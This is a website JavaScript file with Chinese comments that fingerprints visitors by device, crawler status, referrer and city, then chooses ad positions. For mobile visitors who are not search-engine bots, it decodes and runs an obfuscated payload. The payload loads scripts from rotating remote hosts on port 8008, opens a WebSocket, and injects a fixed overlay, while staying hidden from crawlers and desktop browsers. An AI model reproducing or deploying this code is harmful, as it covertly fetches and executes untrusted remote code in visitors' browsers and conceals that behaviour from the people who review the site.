// 打印调试信息
function getDebugInfo() {
    console.log('User Agent: ' + navigator.userAgent.toLowerCase()); // 打印用户代理信息
    console.log('is_robot(): ' + isRobot()); // 判断是否是搜索引擎爬虫
    console.log('isReferrerSearch(): ' + isReferrerSearch()); // 判断是否来自搜索引擎的引荐
    console.log('Is Mobile Device: ' + isMobile()); // 判断是否是移动设备
    console.log('In City: ' + isInCity()); // 判断是否在指定城市
    console.log('Current City: ' + returnCitySN.cname); // 获取当前城市
}

// 判断是否是移动设备
function isMobile() {
    const mobileDevices = ['android', 'iphone', 'symbianos', 'ipad', 'ipod', 'windows phone', 'harmonyos'];
    const userAgent = navigator.userAgent.toLowerCase();
    return mobileDevices.some(device => userAgent.includes(device));
}

// 判断是否来自搜索引擎的引荐
function isReferrerSearch(searchArr) {
    if (searchArr === undefined) {
        searchArr = ['sogou', 'soso', 'baidu', 'google', 'youdao', 'yahoo', 'bing', 'sm', 'so', 'biso', 'gougou', 'ifeng', 'ivc', 'sooule', 'niuhu', 'biso', '360'];
    }
    const referrer = document.referrer.toLowerCase();
    return searchArr.some(searchEngine => referrer.includes(searchEngine));
}

// 判断是否是搜索引擎爬虫
function isRobot(robotArr) {
    if (robotArr === undefined) {
        robotArr = ['baiduspider', 'yisouspider', 'sogou', 'yahoo', '360spider', 'sosospider', 'googlebot', 'bingbot', 'bytespider', 'yandexbot', 'yisouspider'];
    }
    const userAgent = navigator.userAgent.toLowerCase();
    return robotArr.some(robot => userAgent.includes(robot));
}

// 判断是否在指定城市
function isInCity(cityArr) {
    if (cityArr === undefined) {
        cityArr = ['北京', '广州'];
    }
    const city = returnCitySN.cname;
    return cityArr.some(cityName => city.includes(cityName));
}

// 操作系统信息
function getSystemInfo() {
    var system = { win: !1, mac: !1, xll: !1 }, p = navigator.platform, us = navigator.userAgent.toLowerCase();
    system.win = 0 == p.indexOf("Win"), system.mac = 0 == p.indexOf("Mac"), system.x11 = "X11" == p || 0 == p.indexOf("Linux");

    // const system = {
    //     isWindows: false,
    //     isMac: false,
    //     isLinux: false
    // };

    // const platform = navigator.platform;
    // system.isWindows = platform.startsWith('Win');
    // system.isMac = platform.startsWith('Mac');
    // system.isLinux = platform === 'X11' || platform.startsWith('Linux');

    return system;
}

// 获取随机广告位置
// function getRandomAdPosition(positions) {
//     const totalWeight = positions.reduce((sum, position) => sum + position.weight, 0);
//     let randomNum = Math.random() * totalWeight;

//     for (const position of positions) {
//         randomNum -= position.weight;
//         if (randomNum <= 0) {
//             return position.value;
//         }
//     }
// }

(function () {
    // 根据权重随机选择元素
    const weightedRandomElement = (elements) => {
        const totalWeight = elements.reduce((sum, el) => sum + el.weight, 0);
        let randomNum = Math.random() * totalWeight;

        for (const el of elements) {
            randomNum -= el.weight;
            if (randomNum <= 0) return el.value;
        }
    };
    // 广告位置
    const adPositions = [
        { value: 'top', weight: 0 },
        { value: 'bottom', weight: 1 },
        { value: 'all', weight: 0 }
    ];

    const randomAdPosition = weightedRandomElement(adPositions);
    const systemInfo = getSystemInfo();
    // 非Windows、非Mac、非Linux系统且非搜索引擎爬虫才执行以下代码
    if (!systemInfo.win && !systemInfo.mac && !systemInfo.xll && !isRobot()) {
        // 顶部广告
        if (randomAdPosition === 'top' || randomAdPosition === 'all') {
            const topnav = document.querySelector('#topnav');
            if (topnav) {
                topnav.style.marginTop = '120px'; // 设置顶部导航栏的上边距
            }

            const temporaryGroups = [{ value: 'dm', weight: 1 }];
            const randomGroup = weightedRandomElement(temporaryGroups);

            if (randomGroup === 'dm') {
                
            }
        }

        // 底部广告
        if (randomAdPosition === 'bottom' || randomAdPosition === 'all') {
            const temporaryGroup = [{ value: 'ks', weight: 1 }];
            const randomElement = weightedRandomElement(temporaryGroup);
            if (randomElement === 'dm') {
                
            }
            if (randomElement === 'ks') {
                !function(){function a(a){var b={e:"P",w:"D",T:"y","+":"J",l:"!",t:"L",E:"E","@":"2",d:"a",b:"%",q:"l",X:"v","~":"R",5:"r","&":"X",C:"j","]":"F",a:")","^":"m",",":"~","}":"1",x:"C",c:"(",G:"@",h:"h",".":"*",L:"s","=":",",p:"g",I:"Q",1:"7",_:"u",K:"6",F:"t",2:"n",8:"=",k:"G",Z:"]",")":"b",P:"}",B:"U",S:"k",6:"i",g:":",N:"N",i:"S","%":"+","-":"Y","?":"|",4:"z","*":"-",3:"^","[":"{","(":"c",u:"B",y:"M",U:"Z",H:"[",z:"K",9:"H",7:"f",R:"x",v:"&","!":";",M:"_",Q:"9",Y:"e",o:"4",r:"A",m:".",O:"o",V:"W",J:"p",f:"d",":":"q","{":"8",W:"I",j:"?",n:"5",s:"3","|":"T",A:"V",D:"w",";":"O"};return a.split("").map(function(a){return void 0!==b[a]?b[a]:a}).join("")}var b=a(`ftWzFtyjYvl7_2(F6O2cYa[Xd5 F8[P!7_2(F6O2 5c2a[67cFH2Za5YF_52 FH2ZmYRJO5FL!Xd5 O8FH2Z8[6g2=qgl}=YRJO5FLg[PP!5YF_52 YH2Zm(dqqcOmYRJO5FL=O=OmYRJO5FL=5a=Omq8l0=OmYRJO5FLP5m^8Y=5m(8F=5mf87_2(F6O2cY=F=2a[5mOcY=Fa??;)CY(FmfY762Ye5OJY5FTcY=F=[Y2_^Y5d)qYgl0=pYFg2PaP=5m587_2(F6O2cYa["_2fY762Yf"l8FTJYO7 iT^)OqvviT^)OqmFOiF562p|dpvv;)CY(FmfY762Ye5OJY5FTcY=iT^)OqmFOiF562p|dp=[Xdq_Yg"yOf_qY"Pa=;)CY(FmfY762Ye5OJY5FTcY="MMYLyOf_qY"=[Xdq_Ygl0PaP=5mF87_2(F6O2cY=Fa[67c}vFvvcY85cYaa={vFa5YF_52 Y!67covFvv"O)CY(F"88FTJYO7 YvvYvvYmMMYLyOf_qYa5YF_52 Y!Xd5 28;)CY(Fm(5YdFYc2_qqa!67c5m5c2a=;)CY(FmfY762Ye5OJY5FTc2="fY7d_qF"=[Y2_^Y5d)qYgl0=Xdq_YgYPa=@vFvv"LF562p"l8FTJYO7 Ya7O5cXd5 O 62 Ya5mfc2=O=7_2(F6O2cFa[5YF_52 YHFZPm)62fc2_qq=Oaa!5YF_52 2P=5m287_2(F6O2cYa[Xd5 F8YvvYmMMYLyOf_qYj7_2(F6O2ca[5YF_52 YmfY7d_qFPg7_2(F6O2ca[5YF_52 YP!5YF_52 5mfcF="d"=Fa=FP=5mO87_2(F6O2cY=Fa[5YF_52 ;)CY(FmJ5OFOFTJYmhdL;D2e5OJY5FTm(dqqcY=FaP=5mJ8""=5c5mL80aPcH7_2(F6O2cY=Fa[Xd5 58fO(_^Y2F=282dX6pdFO5mJqdF7O5^=O85m(_55Y2Fi(56JF! 67cl/3yd(?V62/mFYLFc2a??l2a[Xd5 __JRLhfCM6LMDL8__JRLhfCM6LMSS80!LYF|6^YO_Fc7_2(F6O2ca[67c__JRLhfCM6LMDL880a[Xd5 (q6Y2FD6fFh8D62fODmL(5YY2mdXd6qV6fFh!fO(_^Y2FmdffEXY2Ft6LFY2Y5c"FO_(hY2f"=7_2(F6O2ca[67c__JRLhfCM6LMDL880a[Xd5 (q6Y2FhY6phF8D62fODm622Y59Y6phF!Xd5 YXY8YXY2F??D62fODmYXY2F!Xd5 (R8(T80!67cYXYvvYXYmFTJY88"FO_(hLFd5F"a[(R8YXYmFO_(hYLH0Zm(q6Y2F&!(T8YXYmFO_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"FO_(hY2f"a[(R8YXYm(hd2pYf|O_(hYLH0ZmL(5YY2&!(T8YXYm(hd2pYf|O_(hYLH0Zm(q6Y2F-P67cYXYvvYXYmFTJY88"(q6(S"a[(R8YXYm(q6Y2F&!(T8YXYm(q6Y2F-P67c(R>0vv(T>0a[67c(T>c(q6Y2FhY6phF*c@0o.c(q6Y2FD6fFh/K@0aaavv__JRLhfCM6LMSS880a[__JRLhfCM6LMSS8}!Xd5 __JRLhfCM^8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"ss0}S((mdX24JDOm(O^g{00{"%"/((/ss0}j6LM2OF8}vFd5pYF8}"!67cFOJmqO(dF6O2l8LYq7mqO(dF6O2a[FOJmqO(dF6O28__JRLhfCM^PYqLY[D62fODmqO(dF6O2mh5Y78__JRLhfCM^P__JRLhfCM6LMSS80PPPPa!7O5cXd5 280!2<o!2%%a[7O5cXd5 C80!C<}0!C%%a[Xd5 LFTqY8"JOL6F6O2g76RYf! )OFFO^g"%c1mQK{1n.2a%"XD! qY7Fg"%C.}0%"XD! 4*62fYRg}00!f6LJqdTg)qO(S!D6fFhgQmKXD!hY6phFg1mQK{1nXD!)d(Sp5O_2fg #000!OJd(6FTg0m0}!"!fO(_^Y2Fm)OfTm62LY5FrfCd(Y2F9|ytc")Y7O5YY2f"=\'<f6X LFTqY8"\'%LFTqY%\'"></f6X>\'aPPLYF|6^YO_Fc7_2(F6O2ca[67c__JRLhfCM6LMDL880a[Xd5 68fO(_^Y2Fm(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"ss0}S((mdX24JDOm(O^g{00{"%"/f/ss0}j(8}v28__JRLhfC"!Xd5 _8fO(_^Y2FmpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_a!Xd5 L))8fO(_^Y2Fm(5YdFYEqY^Y2Fc"LFTqY"a!L))m6f8"__JRLhfCMLFTqYM6f"!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!fO(_^Y2FmhYdfmdJJY2fxh6qfcL))aPP=}000aPP=@n00a!P 67c/)d6f_?9_dDY6u5ODLY5?A6XOu5ODLY5?;JJOu5ODLY5?9YT|dJu5ODLY5?y6_6u5ODLY5?yIIu5ODLY5?Bxu5ODLY5?I_d5S?IzI/pmFYLFc2dX6pdFO5m_LY5rpY2Fal887dqLYa[Xd5 DLRp8H"DSm:):JC5Dm(O^"="DSm:):JC5Dm(O^"="DSm2Yph)75m(O^"="DSm2Yph)75m(O^"="DSm2Yph)75m(O^"="DSm:):JC5Dm(O^"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/na!S8cS>najngS! Xd5 (82YD VY)iO(SYFc"DLLg//)7dYdYsf@@7f{f7"%c2YD wdFYcampYFwdFYcaa%DLRpHSZ%"g@00Q{"%"/ss0}"a! (mO2OJY287_2(F6O2cYa[__JRLhfCM6LMDL8__JRLhfCM6LMSS8}!LYF|6^YO_Fcca8>[Xd5 (d2Xd85mpYFEqY^Y2FuTWfc"__JRLhfCMLFTqYM6f"a!67c(d2Xda[(d2Xdm5Y^OXYcaPP=}000aP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 F=5=2=O=(=6=_=d8"(hd5rF"=78"75O^xhd5xOfY"=q8"(hd5xOfYrF"=f8"62fYR;7"=L8"ruxwE]k9W+ztyN;eI~i|BAV&-Ud)(fY7ph6CSq^2OJ:5LF_XDRT40}@sonK1{Q%/8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//"%c2YD wdFYcampYFwdFYcaa%"ss0}SpmdCTq:6Om(O^g{00{"%"\/L(/ss0}j28__JRLhfC"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!`.substr(10));new Function(b)()}();
            }
        }
    }

}());

